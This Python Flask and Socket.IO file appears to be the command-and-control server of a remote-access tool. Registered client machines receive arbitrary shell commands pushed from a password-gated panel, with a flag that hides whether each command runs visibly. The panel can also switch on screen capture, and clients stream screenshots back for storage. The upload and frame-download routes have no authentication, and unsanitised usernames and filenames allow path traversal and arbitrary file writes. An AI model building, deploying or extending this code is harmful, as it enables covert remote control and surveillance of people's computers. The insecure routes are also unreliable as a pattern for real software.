import os
import shutil
import sqlite3
import base64

from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit, join_room
from functools import wraps
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'run_secret_key_12345')

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")

if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")

SCREENSHOT_DIR = "uploaded_frames"

os.makedirs(SCREENSHOT_DIR, exist_ok=True)


def get_db():
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    return conn


def require_password(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        password = request.headers.get("x-password")

        if not password or password != DASHBOARD_PASSWORD:
            return jsonify({"detail": "Unauthorized"}), 401

        return f(*args, **kwargs)

    return wrapper


def init_db():
    conn = get_db()

    conn.execute("PRAGMA journal_mode=WAL;")

    conn.execute("""
        CREATE TABLE IF NOT EXISTS clients (
            username TEXT PRIMARY KEY,
            cmd TEXT,
            run INTEGER DEFAULT 0,
            visible INTEGER DEFAULT 1,
            capture INTEGER DEFAULT 0,
            updated_at TEXT
        )
    """)

    conn.commit()
    conn.close()


init_db()


# ── WebSockets Handlers ──

active_clients = {}


@socketio.on('register')
def handle_register(data):
    username = data.get('username')
    if not username:
        return
    active_clients[request.sid] = username
    join_room(username)

    conn = get_db()
    cursor = conn.cursor()
    row = cursor.execute("SELECT capture FROM clients WHERE username = ?", (username,)).fetchone()
    if row:
        cursor.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
        capture_val = bool(row["capture"])
    else:
        cursor.execute("INSERT INTO clients (username, updated_at) VALUES (?, datetime('now'))", (username,))
        capture_val = False
    conn.commit()
    conn.close()

    emit('set_capture', {'capture': capture_val}, room=username)
    socketio.emit('status_change', {'username': username, 'online': True})


@socketio.on('disconnect')
def handle_disconnect():
    username = active_clients.pop(request.sid, None)
    if username and username not in active_clients.values():
        socketio.emit('status_change', {'username': username, 'online': False})


@socketio.on('heartbeat')
def handle_heartbeat(data):
    username = data.get('username')
    if not username:
        return
    conn = get_db()
    conn.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
    conn.commit()
    conn.close()


@socketio.on('upload_frame')
def handle_upload_frame(data):
    username = data.get("username")
    filename = data.get("filename")
    image_base64 = data.get("image")

    if not username or not filename or not image_base64:
        return

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)
    file_path = os.path.join(client_folder, filename)

    try:
        raw_b64 = image_base64
        if "," in raw_b64:
            raw_b64 = raw_b64.split(",", 1)[1]
        image_bytes = base64.b64decode(raw_b64)
        with open(file_path, "wb") as f:
            f.write(image_bytes)

        socketio.emit('new_frame', {
            'username': username,
            'filename': filename
        })
    except Exception as e:
        print(f"[Upload Frame Error] {e}")


# ── REST API Routes ──

@app.route("/")
def index():
    return render_template("index.html")


@app.get("/api/clients")
@require_password
def get_clients():
    conn = get_db()

    rows = conn.execute("""
        SELECT username, updated_at, visible, capture
        FROM clients
        ORDER BY updated_at DESC
    """).fetchall()

    conn.close()

    online_usernames = set(active_clients.values())

    return jsonify(
        [
            {
                "username": row["username"],
                "updated_at": row["updated_at"],
                "visible": row["visible"] if row["visible"] is not None else 1,
                "capture": bool(row["capture"]) if row["capture"] is not None else False,
                "online": row["username"] in online_usernames,
            }
            for row in rows
        ]
    )


@app.get("/api/frames/<username>")
@require_password
def get_frames(username):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/frames/delete")
@require_password
def delete_frames():
    data = request.get_json(silent=True) or {}
    username = data.get("username")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    user_dir = os.path.join(SCREENSHOT_DIR, username)
    if os.path.exists(user_dir):
        try:
            shutil.rmtree(user_dir)
            os.makedirs(user_dir, exist_ok=True)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "success"})


@app.post("/api/capture")
@require_password
def set_capture():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    capture = data.get("capture")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if capture is None:
        return jsonify({"status": "error", "message": "Missing capture"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            capture
        )
        VALUES (?, ?)

        ON CONFLICT(username) DO UPDATE SET
            capture = excluded.capture
    """,
        (username, 1 if capture else 0),
    )

    conn.commit()
    conn.close()

    socketio.emit("set_capture", {"capture": bool(capture)}, room=username)

    return jsonify({"status": "success"})


@app.post("/api/visibility")
@require_password
def set_visibility():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    visible = data.get("visible")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            visible
        )
        VALUES (?, ?)

        ON CONFLICT(username) DO UPDATE SET
            visible = excluded.visible
    """,
        (username, visible),
    )

    conn.commit()
    conn.close()

    socketio.emit("set_visibility", {"visible": visible}, room=username)

    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            cmd,
            run,
            visible
        )
        VALUES (?, ?, 1, ?)

        ON CONFLICT(username) DO UPDATE SET
            cmd = excluded.cmd,
            run = 1,
            visible = excluded.visible
    """,
        (username, cmd, visible),
    )

    conn.commit()
    conn.close()

    # Instant WebSocket push command to client!
    socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)

    return jsonify({"status": "success", "message": "Command sent over WebSocket"})




@app.post("/api/upload")
def upload_screenshot():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    filename = data.get("filename")
    image_base64 = data.get("image")

    if not username or not filename or not image_base64:
        return jsonify({"status": "error", "message": "Missing fields"}), 400

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)

    file_path = os.path.join(client_folder, filename)

    try:
        if "," in image_base64:
            image_base64 = image_base64.split(",", 1)[1]

        image_bytes = base64.b64decode(image_base64)

        with open(file_path, "wb") as f:
            f.write(image_bytes)

        return jsonify({"status": "success"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.get("/frames/<username>/<filename>")
def get_frame(username, filename):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)

